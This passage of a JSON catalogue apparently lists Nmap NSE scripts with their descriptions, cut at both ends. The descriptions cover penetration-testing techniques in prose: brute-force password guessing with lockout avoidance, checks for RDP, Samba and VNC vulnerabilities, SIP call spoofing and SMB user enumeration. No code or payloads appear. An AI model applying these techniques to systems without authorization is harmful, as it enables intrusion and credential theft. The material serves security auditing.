    "description": "Detects the version of an Oracle Virtual Server Agent by fingerprinting\nresponses to an HTTP GET request and an XML-RPC method call.\n\nVersion 2.2 of Virtual Server Agent returns a distinctive string in response to an\nHTTP GET request. However versions 3.0 and 3.0.1 return a generic response that\nlooks like any other BaseHTTP/SimpleXMLRPCServer. Versions 2.2 and 3.0 return a\ndistinctive error message in response to a <code>system.listMethods</code>\nXML-RPC call, which however does not distinguish the two versions. Version 3.0.1\nreturns a response to <code>system.listMethods</code> that is different from\nthat of both version 2.2 and 3.0. Therefore we use this strategy: (1.) Send a\nGET request. If the version 2.2 string is returned, return \"2.2\". (2.) Send a\n<code>system.listMethods</code> method call. If an error is\nreturned, return \"3.0\" or \"3.0.1\", depending on the specific format of the\nerror.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "p2p-conficker.nse",
    "description": "Checks if a host is infected with Conficker.C or higher, based on\nConficker's peer to peer communication.\n\nWhen Conficker.C or higher infects a system, it opens four ports: two TCP\nand two UDP. The ports are random, but are seeded with the current week and\nthe IP of the infected host. By determining the algorithm, one can check if\nthese four ports are open, and can probe them for more data.\n\nOnce the open ports are found, communication can be initiated using\nConficker's custom peer to peer protocol.  If a valid response is received,\nthen a valid Conficker infection has been found.\n\nThis check won't work properly on a multihomed or NATed system because the\nopen ports will be based on a nonpublic IP.  The argument\n<code>checkall</code> tells Nmap to attempt communication with every open\nport (much like a version check) and the argument <code>realip</code> tells\nNmap to base its port generation on the given IP address instead of the\nactual IP.\n\nBy default, this will run against a system that has a standard Windows port\nopen (445, 139, 137). The arguments <code>checkall</code> and\n<code>checkconficker</code> will both perform checks regardless of which\nport is open, see the args section for more information.\n\nNote: Ensure your clock is correct (within a week) before using this script!\n\nThe majority of research for this script was done by Symantec Security\nResponse, and some was taken from public sources (most notably the port\nblacklisting was found by David Fifield). A big thanks goes out to everybody\nwho contributed!",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "path-mtu.nse",
    "description": "Performs simple Path MTU Discovery to target hosts.\n\nTCP or UDP packets are sent to the host with the DF (don't fragment) bit set\nand with varying amounts of data.  If an ICMP Fragmentation Needed is received,\nor no reply is received after retransmissions, the amount of data is lowered\nand another packet is sent.  This continues until (assuming no errors occur) a\nreply from the final host is received, indicating the packet reached the host\nwithout being fragmented.\n\nNot all MTUs are attempted so as to not expend too much time or network\nresources.  Currently the relatively short list of MTUs to try contains\nthe plateau values from Table 7-1 in RFC 1191, \"Path MTU Discovery\".\nUsing these values significantly cuts down the MTU search space.  On top\nof that, this list is rarely traversed in whole because:\n* the MTU of the outgoing interface is used as a starting point, and\n* we can jump down the list when an intermediate router sending a \"can't fragment\" message includes its next hop MTU (as described in RFC 1191 and required by RFC 1812)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pcanywhere-brute.nse",
    "description": "Performs brute force password auditing against the pcAnywhere remote access protocol.\n\nDue to certain limitations of the protocol, bruteforcing\nis limited to single thread at a time.\nAfter a valid login pair is guessed the script waits\nsome time until server becomes available again.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pcworx-info.nse",
    "description": "This NSE script will query and parse pcworx protocol to a remote PLC.\nThe script will send a initial request packets and once a response is received,\nit validates that it was a proper response to the command that was sent, and then\nwill parse out the data. PCWorx is a protocol and Program by Phoenix Contact.\n\n\nhttp://digitalbond.com",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pgsql-brute.nse",
    "description": "Performs password guessing against PostgreSQL.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pjl-ready-message.nse",
    "description": "Retrieves or sets the ready message on printers that support the Printer\nJob Language. This includes most PostScript printers that listen on port\n9100. Without an argument, displays the current ready message. With the\n<code>pjl_ready_message</code> script argument, displays the old ready\nmessage and changes it to the message given.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pop3-brute.nse",
    "description": "Tries to log into a POP3 account by guessing usernames and passwords.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pop3-capabilities.nse",
    "description": "Retrieves POP3 email server capabilities.\n\nPOP3 capabilities are defined in RFC 2449. The CAPA command allows a client to\nask a server what commands it supports and possibly any site-specific policy.\nBesides the list of supported commands, the IMPLEMENTATION string giving the\nserver version may be available.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pop3-ntlm-info.nse",
    "description": "This script enumerates information from remote POP3 services with NTLM\nauthentication enabled.\n\nSending a POP3 NTLM authentication request with null credentials will\ncause the remote service to respond with a NTLMSSP message disclosing\ninformation to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "port-states.nse",
    "description": "Prints a list of ports found in each state.\n\nNmap ordinarily summarizes \"uninteresting\" ports as \"Not shown: 94 closed\nports, 4 filtered ports\" but users may want to know which ports were filtered\nvs which were closed. This script will expand these summaries into a list of\nports and port ranges that were found in each state.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "pptp-version.nse",
    "description": "Attempts to extract system information from the point-to-point tunneling protocol (PPTP) service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "profinet-cm-lookup.nse",
    "description": "Sends a DCERPC EPM Lookup Request to PROFINET devices. the DCE/RPC Endpoint Mapper (EPM) targeting Profinet Devices.\n\nProfinet Devices support the udp-based PNIO-CM protocol under port 34964.\nPNIO-CM uses DCE/RPC as its underlying protocol.\n\n\nProfinet Devices support a DCE/RPC UUID Entity under the UUID variant\n'dea00001-6c97-11d1-8271-00a02442df7d'. This script sends the Lookup Request for this UUID.\n\nReferences:\n* https://rt-labs.com/docs/p-net/profinet_details.html#dce-rpc-uuid-entities\n* https://wiki.wireshark.org/EPM",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "puppet-naivesigning.nse",
    "description": "Detects if naive signing is enabled on a Puppet server. This enables attackers\nto create any Certificate Signing Request and have it signed, allowing them\nto impersonate as a puppet agent. This can leak the configuration of the agents\nas well as any other sensitive information found in the configuration files.\n\nThis script makes use of the Puppet HTTP API interface to sign the request.\n\nThis script has been Tested on versions 3.8.5, 4.10.\n\nReferences:\n* https://docs.puppet.com/puppet/4.10/ssl_autosign.html#security-implications-of-nave-autosigning",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "qconn-exec.nse",
    "description": "Attempts to identify whether a listening QNX QCONN daemon allows\nunauthenticated users to execute arbitrary operating system commands.\n\nQNX is a commercial Unix-like real-time operating system, aimed primarily at\nthe embedded systems market. The QCONN daemon is a service provider that\nprovides support, such as profiling system information, to remote IDE\ncomponents. The QCONN daemon runs on port 8000 by default.\n\nFor more information about QNX QCONN, see:\n* http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html\n* http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos\n* http://www.exploit-db.com/exploits/21520\n* http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "qscan.nse",
    "description": "Repeatedly probe open and/or closed ports on a host to obtain a series\nof round-trip time values for each port.  These values are used to\ngroup collections of ports which are statistically different from other\ngroups.  Ports being in different groups (or \"families\") may be due to\nnetwork mechanisms such as port forwarding to machines behind a NAT.\n\nIn order to group these ports into different families, some statistical\nvalues must be computed.  Among these values are the mean and standard\ndeviation of the round-trip times for each port.  Once all of the times\nhave been recorded and these values have been computed, the Student's\nt-test is used to test the statistical significance of the differences\nbetween each port's data.  Ports which have round-trip times that are\nstatistically the same are grouped together in the same family.\n\nThis script is based on Doug Hoyte's Qscan documentation and patches\nfor Nmap.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "quake1-info.nse",
    "description": "Extracts information from Quake game servers and other game servers\nwhich use the same protocol.\n\nQuake uses UDP packets, which because of source spoofing can be used to amplify\na denial-of-service attack. For each request, the script reports the payload\namplification as a ratio. The format used is\n<code>response_bytes/request_bytes=ratio</code>\n\nhttp://www.gamers.org/dEngine/quake/QDP/qnp.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "quake3-info.nse",
    "description": "Extracts information from a Quake3 game server and other games which use the same protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "quake3-master-getservers.nse",
    "description": "Queries Quake3-style master servers for game servers (many games other than Quake 3 use this same protocol).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rdp-enum-encryption.nse",
    "description": "Determines which Security layer and Encryption level is supported by the\nRDP service. It does so by cycling through all existing protocols and ciphers.\nWhen run in debug mode, the script also returns the protocols and ciphers that\nfail and any errors that were reported.\n\nThe script was inspired by MWR's RDP Cipher Checker\nhttp://labs.mwrinfosecurity.com/tools/2009/01/12/rdp-cipher-checker/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rdp-ntlm-info.nse",
    "description": "This script enumerates information from remote RDP services with CredSSP\n(NLA) authentication enabled.\n\nSending an incomplete CredSSP (NTLM) authentication request with null credentials\nwill cause the remote service to respond with a NTLMSSP message disclosing\ninformation to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rdp-vuln-ms12-020.nse",
    "description": "Checks if a machine is vulnerable to MS12-020 RDP vulnerability.\n\nThe Microsoft bulletin MS12-020 patches two vulnerabilities: CVE-2012-0152\nwhich addresses a denial of service vulnerability inside Terminal Server, and\nCVE-2012-0002 which fixes a vulnerability in Remote Desktop Protocol. Both are\npart of Remote Desktop Services.\n\nThe script works by checking for the CVE-2012-0152 vulnerability. If this\nvulnerability is not patched, it is assumed that CVE-2012-0002 is not patched\neither. This script can do its check without crashing the target.\n\nThe way this works follows:\n* Send one user request. The server replies with a user id (call it A) and a channel for that user.\n* Send another user request. The server replies with another user id (call it B) and another channel.\n* Send a channel join request with requesting user set to A and requesting channel set to B. If the server replies with a success message, we conclude that the server is vulnerable.\n* In case the server is vulnerable, send a channel join request with the requesting user set to B and requesting channel set to B to prevent the chance of a crash.\n\nReferences:\n* http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n* http://support.microsoft.com/kb/2621440\n* http://zerodayinitiative.com/advisories/ZDI-12-044/\n* http://aluigi.org/adv/termdd_1-adv.txt\n\nOriginal check by by Worawit Wang (sleepya).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "realvnc-auth-bypass.nse",
    "description": "Checks if a VNC server is vulnerable to the RealVNC authentication bypass\n(CVE-2006-2369).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "redis-brute.nse",
    "description": "Performs brute force passwords auditing against a Redis key-value store.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "redis-info.nse",
    "description": "Retrieves information (such as version number and architecture) from a Redis key-value store.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "resolveall.nse",
    "description": "NOTE: This script has been replaced by the <code>--resolve-all</code>\ncommand-line option in Nmap 7.70\n\nResolves hostnames and adds every address (IPv4 or IPv6, depending on\nNmap mode) to Nmap's target list.  This differs from Nmap's normal\nhost resolution process, which only scans the first address (A or AAAA\nrecord) returned for each host name.\n\nThe script will run on any target provided by hostname. It can also be fed\nhostnames via the <code>resolveall.hosts</code> argument. Because it adds new\ntargets by IP address it will not run recursively, since those new targets were\nnot provided by hostname. It will also not add the same IP that was initially\nchosen for scanning by Nmap.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "reverse-index.nse",
    "description": "Creates a reverse index at the end of scan output showing which hosts run a\nparticular service.  This is in addition to Nmap's normal output listing the\nservices on each host.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rexec-brute.nse",
    "description": "Performs brute force password auditing against the classic UNIX rexec (remote exec) service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rfc868-time.nse",
    "description": "Retrieves the day and time from the Time service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "riak-http-info.nse",
    "description": "Retrieves information (such as node name and architecture) from a Basho Riak distributed database using the HTTP protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rlogin-brute.nse",
    "description": "Performs brute force password auditing against the classic UNIX rlogin (remote\nlogin) service.  This script must be run in privileged mode on UNIX because it\nmust bind to a low source port number.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rmi-dumpregistry.nse",
    "description": "Connects to a remote RMI registry and attempts to dump all of its\nobjects.\n\nFirst it tries to determine the names of all objects bound in the\nregistry, and then it tries to determine information about the\nobjects, such as the class names of the superclasses and\ninterfaces. This may, depending on what the registry is used for, give\nvaluable information about the service. E.g, if the app uses JMX (Java\nManagement eXtensions), you should see an object called \"jmxconnector\"\non it.\n\nIt also gives information about where the objects are located, (marked\nwith @<ip>:port in the output).\n\nSome apps give away the classpath, which this scripts catches in\nso-called \"Custom data\".",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rmi-vuln-classloader.nse",
    "description": "Tests whether Java rmiregistry allows class loading.  The default\nconfiguration of rmiregistry allows loading classes from remote URLs,\nwhich can lead to remote code execution. The vendor (Oracle/Sun)\nclassifies this as a design feature.\n\n\nBased on original Metasploit module by mihi.\n\nReferences:\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rpc-grind.nse",
    "description": "Fingerprints the target RPC port to extract the target service, RPC number and version.\n\nThe script works by sending RPC Null call requests with a random high version\nunsupported number to the target service with iterated over RPC program numbers\nfrom the nmap-rpc file and check for replies from the target port.\nA reply with a RPC accept state 2 (Remote can't support version) means that we\nthe request sent the matching program number, and we proceed to extract the\nsupported versions. A reply with an accept state RPC accept state 1 (remote\nhasn't exported program) means that we have sent the incorrect program number.\nAny other accept state is an incorrect behaviour.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rpcap-brute.nse",
    "description": "Performs brute force password auditing against the WinPcap Remote Capture\nDaemon (rpcap).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rpcap-info.nse",
    "description": "Connects to the rpcap service (provides remote sniffing capabilities\nthrough WinPcap) and retrieves interface information. The service can either be\nsetup to require authentication or not and also supports IP restrictions.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rpcinfo.nse",
    "description": "Connects to portmapper and fetches a list of all registered programs.  It then\nprints out a table including (for each program) the RPC program number,\nsupported version numbers, port number and protocol, and program name.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rsa-vuln-roca.nse",
    "description": "Detects RSA keys vulnerable to Return Of Coppersmith Attack (ROCA) factorization.\n\nSSH hostkeys and SSL/TLS certificates are checked. The checks require recent updates to the openssl NSE library.\n\nReferences:\n* https://crocs.fi.muni.cz/public/papers/rsa_ccs17",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rsync-brute.nse",
    "description": "Performs brute force password auditing against the rsync remote file syncing protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rsync-list-modules.nse",
    "description": "Lists modules available for rsync (remote file sync) synchronization.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rtsp-methods.nse",
    "description": "Determines which methods are supported by the RTSP (real time streaming protocol) server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rtsp-url-brute.nse",
    "description": "Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.\n\nThe script attempts to discover valid RTSP URLs by sending a DESCRIBE\nrequest for each URL in the dictionary. It then parses the response, based\non which it determines whether the URL is valid or not.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "rusers.nse",
    "description": "Connects to rusersd RPC service and retrieves a list of logged-in users.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "s7-info.nse",
    "description": "Enumerates Siemens S7 PLC Devices and collects their device information. This\nscript is based off PLCScan that was developed by Positive Research and\nScadastrangelove (https://code.google.com/p/plcscan/). This script is meant to\nprovide the same functionality as PLCScan inside of Nmap. Some of the\ninformation that is collected by PLCScan was not ported over; this\ninformation can be parsed out of the packets that are received.\n\nThanks to Positive Research, and Dmitry Efanov for creating PLCScan",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "samba-vuln-cve-2012-1182.nse",
    "description": "Checks if target machines are vulnerable to the Samba heap overflow vulnerability CVE-2012-1182.\n\nSamba versions 3.6.3 and all versions previous to this are affected by\na vulnerability that allows remote code execution as the \"root\" user\nfrom an anonymous connection.\n\n\nCVE-2012-1182 marks multiple heap overflow vulnerabilities located in\nPIDL based autogenerated code. This check script is based on PoC by ZDI\nmarked as ZDI-CAN-1503. Vulnerability lies in ndr_pull_lsa_SidArray\nfunction where an attacker is under control of num_sids and can cause\ninsufficient memory to be allocated, leading to heap buffer overflow\nand possibility of remote code execution.\n\nScript builds a malicious packet and makes a SAMR GetAliasMembership\ncall which triggers the vulnerability. On the vulnerable system,\nconnection is dropped and result is \"Failed to receive bytes after 5 attempts\".\nOn patched system, samba throws an error and result is  \"MSRPC call\nreturned a fault (packet type)\".\n\nReferences:\n* https://bugzilla.samba.org/show_bug.cgi?id=8815\n* http://www.samba.org/samba/security/CVE-2012-1182",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "servicetags.nse",
    "description": "Attempts to extract system information (OS, hardware, etc.) from the Sun Service Tags service agent (UDP port 6481).\n\nBased on protocol specs from\nhttp://arc.opensolaris.org/caselog/PSARC/2006/638/stdiscover_protocolv2.pdf\nhttp://arc.opensolaris.org/caselog/PSARC/2006/638/stlisten_protocolv2.pdf\nhttp://arc.opensolaris.org/caselog/PSARC/2006/638/ServiceTag_API_CLI_v07.pdf",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "shodan-api.nse",
    "description": "Queries Shodan API for given targets and produces similar output to\na -sV nmap scan. The ShodanAPI key can be set with the 'apikey' script\nargument, or hardcoded in the .nse file itself. You can get a free key from\nhttps://developer.shodan.io\n\nN.B if you want this script to run completely passively make sure to\ninclude the -sn -Pn -n flags.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sip-brute.nse",
    "description": "Performs brute force password auditing against Session Initiation Protocol\n(SIP) accounts. This protocol is most commonly associated with VoIP sessions.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sip-call-spoof.nse",
    "description": "Spoofs a call to a SIP phone and detects the action taken by the target (busy, declined, hung up, etc.)\n\nThis works by sending a fake sip invite request to the target phone and checking\nthe responses. A response with status code 180 means that the phone is ringing.\nThe script waits for the next responses until timeout is reached or a special\nresponse is received.  Special responses include:  Busy (486), Decline (603),\nTimeout (408) or Hang up (200).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sip-enum-users.nse",
    "description": "Enumerates a SIP server's valid extensions (users).\n\nThe script works by sending REGISTER SIP requests to the server with the\nspecified extension and checking for the response status code in order\nto know if an extension is valid. If a response status code is 401 or\n407, it means that the extension is valid and requires authentication. If the\nresponse status code is 200, it means that the extension exists and doesn't\nrequire any authentication while a 403 response status code means that\nextension exists but access is forbidden. To skip false positives, the script\nbegins by sending a REGISTER request for a random extension and checking for\nresponse status code.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sip-methods.nse",
    "description": "Enumerates a SIP Server's allowed methods (INVITE, OPTIONS, SUBSCRIBE, etc.)\n\nThe script works by sending an OPTION request to the server and checking for\nthe value of the Allow header in the response.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "skypev2-version.nse",
    "description": "Detects the Skype version 2 service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-brute.nse",
    "description": "Attempts to guess username/password combinations over SMB, storing discovered combinations\nfor use in other scripts. Every attempt will be made to get a valid list of users and to\nverify each username before actually using them. When a username is discovered, besides\nbeing printed, it is also saved in the Nmap registry so other Nmap scripts can use it. That\nmeans that if you're going to run <code>smb-brute.nse</code>, you should run other <code>smb</code> scripts you want.\nThis checks passwords in a case-insensitive way, determining case after a password is found,\nfor Windows versions before Vista.\n\nThis script is specifically targeted towards security auditors or penetration testers.\nOne example of its use, suggested by Brandon Enright, was hooking up <code>smb-brute.nse</code> to the\ndatabase of usernames and passwords used by the Conficker worm (the password list can be\nfound at http://www.skullsecurity.org/wiki/index.php/Passwords, among other places.\nThen, the network is scanned and all systems that would be infected by Conficker are\ndiscovered.\n\nFrom the penetration tester perspective its use is pretty obvious. By discovering weak passwords\non SMB, a protocol that's well suited for bruteforcing, access to a system can be gained.\nFurther, passwords discovered against Windows with SMB might also be used on Linux or MySQL\nor custom Web applications. Discovering a password greatly beneficial for a pen-tester.\n\nThis script uses a lot of little tricks that I (Ron Bowes) describe in detail in a blog\nposting, http://www.skullsecurity.org/blog/?p=164. The tricks will be summarized here, but\nthat blog is the best place to learn more.\n\nUsernames and passwords are initially taken from the unpwdb library. If possible, the usernames\nare verified as existing by taking advantage of Windows' odd behaviour with invalid username\nand invalid password responses. As soon as it is able, this script will download a full list\nof usernames from the server and replace the unpw usernames with those. This enables the\nscript to restrict itself to actual accounts only.\n\nWhen an account is discovered, it's saved in the <code>smb</code> module (which uses the Nmap\nregistry). If an account is already saved, the account's privileges are checked; accounts\nwith administrator privileges are kept over accounts without. The specific method for checking\nis by calling <code>GetShareInfo(\"IPC$\")</code>, which requires administrative privileges. Once this script\nis finished (all other smb scripts depend on it, it'll run first), other scripts will use the saved account\nto perform their checks.\n\nThe blank password is always tried first, followed by \"special passwords\" (such as the username\nand the username reversed). Once those are exhausted, the unpwdb password list is used.\n\nOne major goal of this script is to avoid account lockouts. This is done in a few ways. First,\nwhen a lockout is detected, unless you user specifically overrides it with the <code>smblockout</code>\nargument, the scan stops. Second, all usernames are checked with the most common passwords first,\nso with not-too-strict lockouts (10 invalid attempts), the 10 most common passwords will still\nbe tried. Third, one account, called the canary, \"goes out ahead\"; that is, three invalid\nattempts are made (by default) to ensure that it's locked out before others are.\n\nIn addition to active accounts, this script will identify valid passwords for accounts that\nare disabled, guest-equivalent, and require password changes. Although these accounts can't\nbe used, it's good to know that the password is valid. In other cases, it's impossible to\ntell a valid password (if an account is locked out, for example). These are displayed, too.\nCertain accounts, such as guest or some guest-equivalent, will permit any password. This\nis also detected. When possible, the SMB protocol is used to its fullest to get maximum\ninformation.\n\nWhen possible, checks are done using a case-insensitive password, then proper case is\ndetermined with a fairly efficient bruteforce. For example, if the actual password is\n\"PassWord\", then \"password\" will work and \"PassWord\" will be found afterwards (on the\n14th attempt out of a possible 256 attempts, with the current algorithm).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-double-pulsar-backdoor.nse",
    "description": "Checks if the target machine is running the Double Pulsar SMB backdoor.\n\nBased on the python detection script by Luke Jennings of Countercept.\nhttps://github.com/countercept/doublepulsar-detection-script",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-domains.nse",
    "description": "Attempts to enumerate domains on a system, along with their policies. This generally requires\ncredentials, except against Windows 2000. In addition to the actual domain, the \"Builtin\"\ndomain is generally displayed. Windows returns this in the list of domains, but its policies\ndon't appear to be used anywhere.\n\nMuch of the information provided is useful to a penetration tester, because it tells the\ntester what types of policies to expect. For example, if passwords have a minimum length of 8,\nthe tester can trim his database to match; if the minimum length is 14, the tester will\nprobably start looking for sticky notes on people's monitors.\n\nAnother useful piece of information is the password lockouts. A penetration tester often wants\nto know whether or not there's a risk of negatively impacting a network, and this will\nindicate it. The SID is displayed, which may be useful in other tools; the users are listed,\nwhich uses different functions than <code>smb-enum-users.nse</code> (though likely won't\nget different results), and the date and time the domain was created may give some insight into\nits history.\n\nAfter the initial <code>bind</code> to SAMR, the sequence of calls is:\n* <code>Connect4</code>: get a connect_handle\n* <code>EnumDomains</code>: get a list of the domains (stop here if you just want the names).\n* <code>QueryDomain</code>: get the SID for the domain.\n* <code>OpenDomain</code>: get a handle for each domain.\n* <code>QueryDomainInfo2</code>: get the domain information.\n* <code>QueryDomainUsers</code>: get a list of the users in the domain.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-groups.nse",
    "description": "Obtains a list of groups from the remote Windows system, as well as a list of the group's users.\nThis works similarly to <code>enum.exe</code> with the <code>/G</code> switch.\n\nThe following MSRPC functions in SAMR are used to find a list of groups and the RIDs of their users. Keep\nin mind that MSRPC refers to groups as \"Aliases\".\n\n* <code>Bind</code>: bind to the SAMR service.\n* <code>Connect4</code>: get a connect_handle.\n* <code>EnumDomains</code>: get a list of the domains.\n* <code>LookupDomain</code>: get the RID of the domains.\n* <code>OpenDomain</code>: get a handle for each domain.\n* <code>EnumDomainAliases</code>: get the list of groups in the domain.\n* <code>OpenAlias</code>: get a handle to each group.\n* <code>GetMembersInAlias</code>: get the RIDs of the members in the groups.\n* <code>Close</code>: close the alias handle.\n* <code>Close</code>: close the domain handle.\n* <code>Close</code>: close the connect handle.\n\nOnce the RIDs have been termined, the\n* <code>Bind</code>: bind to the LSA service.\n* <code>OpenPolicy2</code>: get a policy handle.\n* <code>LookupSids2</code>: convert SIDs to usernames.\n\nI (Ron Bowes) originally looked into the possibility of using the SAMR function <code>LookupRids2</code>\nto convert RIDs to usernames, but the function seemed to return a fault no matter what I tried. Since\nenum.exe also switches to LSA to convert RIDs to usernames, I figured they had the same issue and I do\nthe same thing.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-processes.nse",
    "description": "Pulls a list of processes from the remote server over SMB. This will determine\nall running processes, their process IDs, and their parent processes. It is done\nby querying the remote registry service, which is disabled by default on Vista;\non all other Windows versions, it requires Administrator privileges.\n\nSince this requires administrator privileges, it isn't especially useful for a\npenetration tester, since they can effectively do the same thing with metasploit\nor other tools. It does, however, provide for a quick way to get process lists\nfor a bunch of systems at the same time.\n\nWARNING: I have experienced crashes in <code>regsvc.exe</code> while making registry calls\nagainst a fully patched Windows 2000 system; I've fixed the issue that caused\nit, but there's no guarantee that it (or a similar vulnerability in the same code) won't\nshow up again. Since the process automatically restarts, it doesn't negatively\nimpact the system, besides showing a message box to the user.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-services.nse",
    "description": "Retrieves the list of services running on a remote Windows system.\nEach service attribute contains service name, display name and service status of\neach service.\n\nNote: Modern Windows systems requires a privileged domain account in order to\nlist the services.\n\nReferences:\n* https://technet.microsoft.com/en-us/library/bb490995.aspx\n* https://en.wikipedia.org/wiki/Windows_service",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-sessions.nse",
    "description": "Enumerates the users logged into a system either locally or through an SMB share. The local users\ncan be logged on either physically on the machine, or through a terminal services session.\nConnections to a SMB share are, for example, people connected to fileshares or making RPC calls.\nNmap's connection will also show up, and is generally identified by the one that connected \"0\nseconds ago\".\n\nFrom the perspective of a penetration tester, the SMB Sessions is probably the most useful\npart of this program, especially because it doesn't require a high level of access. On, for\nexample, a file server, there might be a dozen or more users connected at the same time. Based\non the usernames, it might tell the tester what types of files are stored on the share.\n\nSince the IP they're connected from and the account is revealed, the information here can also\nprovide extra targets to test, as well as a username that's likely valid on that target. Additionally,\nsince a strong username to ip correlation is given, it can be a boost to a social engineering\nattack.\n\nEnumerating the logged in users is done by reading the remote registry (and therefore won't\nwork against Vista, which disables it by default). Keys stored under <code>HKEY_USERS</code> are\nSIDs that represent the connected users, and those SIDs can be converted to proper names by using\nthe <code>lsar.LsaLookupSids</code> function. Doing this requires any access higher than\nanonymous; guests, users, or administrators are all able to perform this request on Windows 2000,\nXP, 2003, and Vista.\n\nEnumerating SMB connections is done using the <code>srvsvc.netsessenum</code> function, which\nreturns the usernames that are logged in, when they logged in, and how long they've been idle\nfor. The level of access required for this varies between Windows versions, but in Windows\n2000 anybody (including the anonymous account) can access this, and in Windows 2003 a user\nor administrator account is required.\n\nI learned the idea and technique for this from Sysinternals' tool, <code>PsLoggedOn.exe</code>. I (Ron\nBowes) use similar function calls to what they use (although I didn't use their source),\nso thanks go out to them. Thanks also to Matt Gardenghi, for requesting this script.\n\nWARNING: I have experienced crashes in regsvc.exe while making registry calls\nagainst a fully patched Windows 2000 system; I've fixed the issue that caused it,\nbut there's no guarantee that it (or a similar vuln in the same code) won't show\nup again. Since the process automatically restarts, it doesn't negatively impact\nthe system, besides showing a message box to the user.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-shares.nse",
